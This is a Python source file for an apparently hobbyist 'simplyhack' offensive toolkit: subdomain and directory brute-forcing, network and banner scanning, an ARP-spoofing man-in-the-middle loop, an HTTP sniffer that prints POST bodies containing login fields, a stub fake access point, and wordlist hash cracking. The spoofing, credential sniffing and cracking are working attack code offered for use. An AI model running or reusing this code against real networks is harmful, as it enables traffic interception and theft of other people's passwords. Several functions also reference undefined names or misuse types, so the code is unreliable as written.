#!/usr/bin/env python3

# © 2021 Abhishek Dangat, All Rights Reserved

import subprocess
import time
import re
import socket
import os
import sys
import requests
import hashlib
import urllib.request
#from socket import *
import scapy.all as scapy
from colorama import Fore, Style
from scapy.layers import http
from threading import *

red         = Fore.RED
lightred    = Fore.LIGHTRED_EX
green       = Fore.GREEN
lightgreen  = Fore.LIGHTGREEN_EX
yellow      = Fore.YELLOW
lightyellow = Fore.LIGHTYELLOW_EX
reset       = Style.RESET_ALL

def protocols_portNumbers(protocol):
    if protocol == "ftp": #File Transfer Protocol
        return 21
    elif protocol == "tftp": #Trivial File Transfer Protocol
        return 69
    elif protocol == "sftp": #Secure File Transfer Protocol
        return 989
    elif protocol == "ssh": #Secure Shell
        return 22
    elif protocol == "telnet": #Teletype Network Protocol
        return 23
    elif protocol == "smtp": #Simple Main Transfer Protocol
        return 25
    elif protocol == "ipsec": #IP Security
        return 50
    elif protocol == "dns": #Domain Naming System
        return 53
    elif protocol == "dhcp": #Dynamic Host Configuration Protocol
        return 67
    elif protocol == "http": #Hyper Text Transfer Protocol
        return 80
    elif protocol == "https": #Hyprt Text Transfer Protocol Secure
        return 443
    elif protocol == "pop3": #Post Office Protocol 3
        return 110
    elif protocol == "nntp": #Network News Transfer Protocol
        return 119
    elif protocol == "ntp": #Network Time Protocol
        return 123
    elif protocol == "netbios": #Network Basic Input/Output System
        return 135
    elif protocol == "imap4": #Internet Message Access Protocol 4
        return 143
    elif protocol == "snmp": #Simple Network Management Protocol
        return 161
    elif protocol == "ldap": #Lightweight Directory Access Protocol
        return 398
    elif protocol == "rdp": #Remote Desktop Protocol
        return 3389

def help():
    print("""[subdomain scanning] - simplyhack.subdomain_scanner(domain="example.com", protocol="http/https", wordlist="some_subdomain_wordlist.txt")

[directory scanning] - simplyhack.directory_scanner(domain="example.com", wordlist="some_directory_wordlist.txt")

[DNS lookup] - simplyhack.dns_lookup(url="exapmle.com")

[reverse DNS lookup] - simplyhack.reverse_dns_lookup(ip="xxx.xxx.xxx.xxx")

[web vuln scanner] - simplyhack.web_vuln_scan(domain="http://www.example.com")

[local network scanner] - simplyhack.local_scan(targetIP="192.168.2.1/24")

[port vuln scanner] - simplyhack.port_vulnscan(ip="192.168.2.") DO NOT INCLUDE THE LAST DIGITS OF THE IP

[detect network attacks] - simplyhack.detect_net_attack(interface="wlan0/eth0/etc")

[MITM (ARP spoof)] - simplyhack.arp_spoof(routerIP="192.168.2.1", targetIP="192.168.2.201")

[MITM (packet sniffing)] - simplyhack.sniff_packets(interface="wlan0/wlan1/eth0/etc")

[Password cracking] - simplyhack.hash_crack(hash_type="sha1/sha224/sha256/sha512/md5", passwordHash="Your password hash here", wordlist="default(if you want to use default wordlist)" or specify path wordlist="/xxx/xxx/xxx/xxx/wordlist.txt")""")

def get_ownMAC(interface):
    IFCONFIG_SEARCH_RESULT = subprocess.check_output(["sudo", "ifconfig", interface]).decode()
    MAC_ADDRESS_CHECK_IFCONFIG_RESULTS = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", IFCONFIG_SEARCH_RESULTS)
    
    return MAC_ADDRESS_CHECK_IFCONFIG_RESULTS

def get_ownIPv4(interface):
    IFCONFIG_SEARCH_IP_RESULTS = subprocess.check_output(["sudo", "ifconfig", interface]).decode()
    IPv4_ADDRESS_CHECK_FROM_IFCONFIG_RESULTS = re.search(r"\d\d\d.\d\d\d.\d\d.\d\d")

    return IPv4_ADDRESS_CHECK_FROM_IFCONFIG_RESULTS

def get_TargetMAC_Address(targetIP):
    arpRequest = scapy.ARP(pdst=targetIP)
    requestBroadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestToBroadcast = requestBroadcast/arpRequest
    listOfAnsweredRequests = scapy.srp(arpRequestToBroadcast, timeout=1, verbose=False)[0]

    return listOfAnsweredRequests[0][1].hwsrc

def GET_HTTP_RESPONSE(domainToCheck):
    try:
        return requests.get(domainToCheck)
    except requests.exceptions.ConnectionError:
            pass

def subdomain_scanner(domain, protocol, wordlist):
    with open(wordlist) as subdomainWordlist:
        for singleSubdomainKeyword in subdomainWordlist:
            strippedSingleSubdomainKeyword = singleSubdomainKeyword.strip()
            domainURL_withoutSUB = protocol + "://" + domain
            completeURL = protocol + '://' + strippedSingleSubdomainKeyword + "." + domain
            HTTP_RESPONSE = GET_HTTP_RESPONSE(completeURL)
            if HTTP_RESPONSE:
                print("[" + lightgreen + "SUBDOMAIN DISCOVERED" + reset + f"] -----> {completeURL}")

def directory_scanner(domain, wordlist):
    with open(wordlist) as directoryWordlist:
        for singleDirectoryKeyword in directoryWordlist:
            strippedSingleDirectoryKeyword = singleDirectoryKeyword.strip()
            domainNameDIR = domain + "/" + strippedSingleDirectoryKeyword
            HTTP_RESPONSE_DOMAIN    = GET_HTTP_RESPONSE(domainNameDIR)
            if HTTP_RESPONSE_DOMAIN:
                print(f"[{lightgreen}DISCOVERED DIRECTORY{reset}] -----> {domainName}")

def dns_lookup(url):
    addressof_DNS_URL = socket.gethostbyname(url)
    print("\n[" + lightgreen + "DNS results" + reset + "] = " + addressof_DNS_URL)

def reverse_dns_lookup(ip):
    addressof_RDNS_URL = socket.gethostbyaddr(ip)[0]
    print("\n[" + lightgreen + "RDNS results" + reset + "] = " + addressof_RDNS_URL)

def web_vuln_scan(domain):
    FLAWS_FOUND_INFO = {"HTTP":"Vulnerable to packet sniffing and other threats",
         "Strict-Transport-Security":"HTTP Strict Transport Security is an excellent feature to support on your site and strengthens your implementation of TLS by getting the User Agent to enforce the use of HTTPS. Recommended value Strict-Transport-Security: max-age=31536000; includeSubDomains",
         "X-Frame-Options":"X-Frame-Options tells the browser whether you want to allow your site to be framed or not. By preventing a browser from framing your site you can defend against attacks like clickjacking. Recommended value X-Frame-Options: SAMEORIGIN",
         "X-Content-Type-Options":"X-Content-Type-Options stops a browser from trying to MIME-sniff the content type and forces it to stick with the declared content-type. The only valid value for this header is X-Content-Type-Options: nosniff",
         "Content-Security-Policy":"Content Security Policy is an effective measure to protect your site from XSS attacks. By whitelisting sources of approved content, you can prevent the browser from loading malicious assets.",
         "Referrer-Policy":"Referrer Policy is a new header that allows a site to control how much information the browser includes with navigations away from a document and should be set by all sites.",
         "Permissions-Policy":"Permissions Policy is a new header that allows a site to control which features and APIs can be used in the browser."}

    MISSING_SECURITY_HEADERS = []
    PRESENT_SECURITY_HEADERS = []
    URL_HTTP_HTTPS = 0

    DOMAIN_SECURITY_HEADERS = requests.get(domain).headers
    if "https" in domain:
        URL_HTTP_HTTPS=1

    if "Strict-Transport-Security" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("Strict-Transport-Security")
    else:
        MISSING_SECURITY_HEADERS.append("Strict-Transport-Security")

    if "X-Frame-Options" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("X-Frame-Options")
    else:
        MISSING_SECURITY_HEADERS.append("X-Frame-Options")

    if "X-Content-Type-Options" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("X-Content-Type-Options")
    else:
        MISSING_SECURITY_HEADERS.append("X-Content-Type-Options")

    if "Content-Security-Policy" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("Content-Security-Policy")
    else:
        MISSING_SECURITY_HEADERS.append("Content-Security-Policy")

    if "Referrer-Policy" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("Referrer-Policy")
    else:
        MISSING_SECURITY_HEADERS.append("Referrer-Policy")

    if "Permissions-Policy" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("Permissions-Policy")
    else:
        MISSING_SECURITY_HEADERS.append("Permissions-Policy")

    for SINGLE_MISSING_SECURITY_HEADER in MISSING_SECURITY_HEADERS:
        time.sleep(1)
        print("\n[" + Fore.LIGHTRED_EX + "Missing" + Style.RESET_ALL + "] ---> [" + Fore.LIGHTRED_EX + SINGLE_MISSING_SECURITY_HEADER + Style.RESET_ALL + "] ---> [" + FLAWS_FOUND_INFO[SINGLE_MISSING_SECURITY_HEADER] + "]")

def local_scan(targetIP):
    try:
        if targetIP:
            if len(targetIP)<=18:
                arp_request = scapy.ARP()
                arp_request.pdst=targetIP
                arp_requestBroadcast = scapy.Ether()
                arp_requestBroadcast.dst ="ff:ff:ff:ff:ff:ff"
                finalBroadcast = arp_requestBroadcast/arp_request
                responsePacketsAnsweredList = scapy.srp(finalBroadcast, timeout=1, verbose=False)[0]
                if responsePacketsAnsweredList:
                    print("\n[" + lightgreen + "*" + reset + "] [" + lightgreen + "CLIENTS FOUND" + reset + "]")
                    for singleElement in responsePacketsAnsweredList:
                        print(" |")
                        print(" -----> [(" + lightgreen + "IP" + reset + ") => " + lightyellow + singleElement[1].psrc + reset + "] [(" + lightgreen + "MAC" + reset + ") => " + lightyellow + singleElement[1].hwsrc + reset + "]")
                        time.sleep(1)
                else:
                    print("[" + lightred + "-" + reset + "] " + lightred + "We ran into an error :( . Please recheck if the IP address/range you entered is valid" + reset)
            else:
                print("[" + lightred + "-" + reset + "] " + lightred + "Invalid IP format" + reset)
        else:
            print("[" + lightred + "-" + reset + "] " + lightred + "Missing field IP Address in" + lightyellow + " hacker-man.local_scan(IP)" + reset)
    except PermissionError:
        print("\n[" + red + "You must run this as root" + reset + "]")

def scanConnection(targetHost, targetPort):
        socketConnectionObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #socketConnectionObject.setdefaulttimeout(2)
        if socketConnectionObject.connect_ex((targetHost, targetPort)):
            print("[" + lightgreen + f"Port {targetPort}" + reset + "] is" + lightred + " CLOSE" + reset)
            time.sleep(0.5)
        else:
            socketConnectionObject.connect((targetHost, targetPort))
            print("[" + lightgreen + f"Port {targetPort}" + reset + "] is" + lightgreen + " OPEN" + reset)
            time.sleep(0.5)

def bannerGrab(ip, portNum):
    VULNERABLE_BANNERS = [
            "3Com 3CDaemon FTP Server Version 2.0", 
            "Ability Server 2.34",
            "CCProxy Telnet Service Ready",
            "ESMTP TABS Mail Server for Windows NT",
            "FreeFloat Ftp Server (Version 1.00)",
            "IMAP4rev1 MDaemon 9.6.4 ready",
            "MailEnable Service, Version: 0-1.54",
            "NetDecision-HTTP-Server 1.0",
            "PSO Proxy 0.9",
            "SAMBAR  Sami FTP Server 2.0.2",
            "Spipe 1.0",
            "TelSrv 1.5",
            "WDaemon 6.8.5",
            "WinGate 6.1.1",
            "Xitami",
            "YahooPOPs! Simple Mail Transfer Service Ready"
            ]
    try:
        socket.setdefaulttimeout(2)
        socketObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketObject.connect((ip, portNum))
        banner = socketObject.recv(1024)
        for singleBanner in VULNERABLE_BANNERS:
            if singleBanner in banner:
                return banner
    except:
        return


def port_vulnscan(ip):
    VULNERABLE_BANNERS = [
            "3Com 3CDaemon FTP Server Version 2.0", 
            "Ability Server 2.34",
            "CCProxy Telnet Service Ready",
            "ESMTP TABS Mail Server for Windows NT",
            "FreeFloat Ftp Server (Version 1.00)",
            "IMAP4rev1 MDaemon 9.6.4 ready",
            "MailEnable Service, Version: 0-1.54",
            "NetDecision-HTTP-Server 1.0",
            "PSO Proxy 0.9",
            "SAMBAR  Sami FTP Server 2.0.2",
            "Spipe 1.0",
            "TelSrv 1.5",
            "WDaemon 6.8.5",
            "WinGate 6.1.1",
            "Xitami",
            "YahooPOPs! Simple Mail Transfer Service Ready"
            ]

    VULNERABLE_PORTS = [21, 22, 23, 25, 53, 443, 110, 135, 137, 138, 139, 1434]
    
    for ipLastField in range(1, 255):
        ipAddress = ip + str(ipLastField)
        for port in VULNERABLE_PORTS:
            vulnerableBanner = bannerGrab(ipAddress, port)
            strPort = str(port)
            if vulnerableBanner:
                print("[", lightgreen, "VULNERABLE", reset, "]> [", lightgreen, ipAddress, reset, ":", lightgreen, strPort, reset, "] -----> [", lightgreen, vulnerableBanner, reset, "]")
            else:
                print("[", lightred, "NOT VULNERABLE", reset, "]> [", lightred, ipAddress, reset, ":", lightred, strPort, reset, "] -----> [", lightred, vulnerableBanner, reset, "]")

"""
    sockObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    socket.setdefaulttimeout(2)
    for port in range(1, 1000):
        if sockObject.connect_ex((targetIP, port)):
            print("[" + lightred + f"Port {port}" + reset + "] is" + lightred + " CLOSE" + reset)
            time.sleep(1)
        else:
            print("[" + lightgreen + f"Port {port}" + reset + "] is" + lightgreen + " OPEN" + reset)
            time.sleep(1)

    try:
        targetIpv4Address = socket.gethostbyname(targetHost)
    except:
        print("[" + lightred + "Unknown IP" + reset + "]")
    try:
        targetIpv4AddressName = gethostbyaddr(targetIpv4Address)
        print("[" + lightgreen + "+" + reset + "] Started scanning [" + lightgreen + targetIpv4AddressName + reset + "] :-")
    except:
        print("[" + lightgreen + "+" + reset + "] Started scanning [" + lightgreen + targetIpv4Address + reset + "] :-")

    socket.setdefaulttimeout(1.5)

    for singleTargetPort in targetPorts:
        threadObject = Thread(target=scanConnection, args=(targetHost, int(singleTargetPort)))
        threadObject.start()
        time.sleep(1)
"""

def ssh_bruteforce(host, username):
    print()

def detect_net_attack(interface):
    scapy.sniff(iface=interface, store=False, prn=detect_netattack_back)

def detect_netattack_back(networkPacket):
    if networkPacket.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
        try:
            realMAC_ADDRESS = get_TargetMAC_Address(networkPacket[scapy.ARP].psrc)
            MACinResponse   = networkPacket[scapy.ARP].hwsrc

            if realMAC_ADDRESS != MACinResponse:
                print("[" + lightred + "ALERT" + reset + "] - " + lightred + "ARP Spoofing detected" + reset)
        except IndexError:
            pass

def arp_spoof_back(targetIP, spoofIP):
    targetMAC = get_TargetMAC_Address(targetIP)
    ARP_PACKET = scapy.ARP(op=(2), pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(ARP_PACKET, verbose=False)

def arp_spoof_back_reverse(destIP, srcIP):
    destMAC_Address = get_TargetMAC_Address(destIP)
    sourceIPv4_MAC = get_targetMAC_Address(srcIP)
    ARP_PACKET = scapy.ARP(op=(2), pdst=destIP, hwdst=destMAC_Address, psrc=srcIP, hwsrc=sourceIPv4_MAC)

def arp_spoof(routerIP, targetIP):
    numberOfPacketsSent = 0
    time.sleep(2)
    print("\n[" + lightgreen + "ARP Spoof Started" + reset + "]\n")
    try:
        while True:
            arp_spoof_back(targetIP, routerIP)
            arp_spoof_back(routerIP, targetIP)
            numberOfPacketsSent = numberOfPacketsSent + 2
            typeCasedNumOfPackets = str(numberOfPacketsSent)
            print("[" + lightgreen + "*" + reset + f"] Sent {typeCasedNumOfPackets} ARP packets")
            time.sleep(2)
    except PermissionError:
        print("\n[" + red + "You must run this as root" + reset + "]")

def urlProtocolNameExtractor(portNum):
    if portNum == 80:
        return "http"
    elif portNum == 21:
        return "ftp"
    elif portNum == 22:
        return "ssh"
    elif portNum == 25:
        return "smtp"

def sniff_packets(interface):
    print("\n[" + lightred + "-" + reset + "] " + lightred + "This packet sniffer is not yet fully built." + reset)
    #protocolPortNumbers = str(protocols_portNumbers(protocol))
    scapy.sniff(iface=interface, store=False, prn=processedNetworkPackets, filter="port 80")

def processedNetworkPackets(packetToProcess):
    try:
        if packetToProcess.haslayer(http.HTTPRequest): # or packetToProcess.haslayer(scapy.Raw):
            #if packetToProcess.haslayer(scapy.Raw): # or packetToProcess.haslayer(HTTPRequest):
            packetsWithHTTP_Layer = packetToProcess[http.HTTPRequest].Referer
            urlProtocolPort = packetToProcess[scapy.TCP].dport
            urlProtocolName = urlProtocolNameExtractor(urlProtocolPort)
            url = urlProtocolName + "://" + packetToProcess[http.HTTPRequest].Host.decode() + packetToProcess[http.HTTPRequest].Path.decode()
            ipAddress = packetToProcess[scapy.IP].src
            requestMethod = packetToProcess[http.HTTPRequest].Method.decode()
            print("[" + lightgreen + ipAddress + reset + "][" + lightgreen + requestMethod + reset + "] -----> " + lightgreen + url + reset)
            """
            if "http://" in packetsWithHTTP_Layer.decode('UTF-8'):
                print(packetToProcess[http.HTTPRequest].Referer)
            """
            if packetToProcess.haslayer(scapy.Raw) and requestMethod == "POST":
                loadRawString = packetToProcess[scapy.Raw].load
                possibleLoginKeywords = ["username", "user", "usr", "uname", "email", "emailaddr", "password", "pass", "passwd", "login", "loginpassword", "loginpass", "name", "handel", "id", "urd_id", "usrid"]
                for singlePossibleLoginKeyword in possibleLoginKeywords:
                    if singlePossibleLoginKeyword in loadRawString.decode():
                        print(loadRawString)
                        break
    except IndexError:
        pass

#def dos()

def fake_access_point(interface, fap_name):
    randomMacAddress = ["8a:2d:19:47:9a:23", "70:0c:f6:c7:c7:4d", "c0:9b:6b:01:27:d6", "32:0c:c1:fb:ba:b7", "8e:b9:92:48:16:c5", "58:7b:de:68:8c:e6", "be:e9:1c:cd:a6:bd", "28:c1:a1:aa:84:cb", "b2:65:df:d1:41:10", "86:ff:2e:9e:69:55", "e6:77:8a:1b:64:28", "40:d8:e7:d1:7a:63", "ca:f0:6a:4e:bd:32", "f4:ba:62:0b:19:35", "90:15:6e:64:85:ee", "d1:a6:55:3c:8a:c1", "28:2d:19:f6::c7:4d"]
    fakeAccessPointName = fap_name

def hash_crack(hash_type, passwordHash, wordlist):
    passwordsTried = 0
    if wordlist != "default":
        if hash_type == "sha1":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.sha1(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
        elif hash_type == "sha224":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.sha224(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
        elif hash_type == "sha256":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.sha256(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
        elif hash_type == "sha512":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.sha512(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
        elif hash_type == "md5":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.md5(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
    elif wordlist == "default":
        if hash_type == "sha1":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.sha1(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
        elif hash_type == "sha224":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.sha224(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
        elif hash_type == "sha256":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.sha256(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
        elif hash_type == "sha512":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.sha512(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
        elif hash_type == "md5":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.md5(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
